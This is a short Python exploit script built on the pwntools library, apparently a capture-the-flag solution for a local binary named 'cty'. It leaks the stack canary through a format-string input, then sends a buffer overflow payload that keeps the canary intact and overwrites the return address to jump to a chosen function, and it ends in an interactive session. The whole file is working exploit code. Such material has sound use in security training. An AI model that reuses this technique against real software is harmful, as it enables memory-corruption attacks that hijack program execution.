#!/usr/bin/evn python3
from pwn import *

e = ELF('./cty')
io = e.process()
#context.terminal = ['tmux', 'splitw', 'h']
gdb.attach(io)
io.sendline('%39$lx')
leak = io.recvline()
canary = int(leak.strip(),16)
log.info("Canary: %s" % (hex(canary)))


run = 0x401179
pl = b'A'*8
payload = b'A'*264 + p64(canary) + pl + p64(run)
io.sendline(payload)
io.interactive()

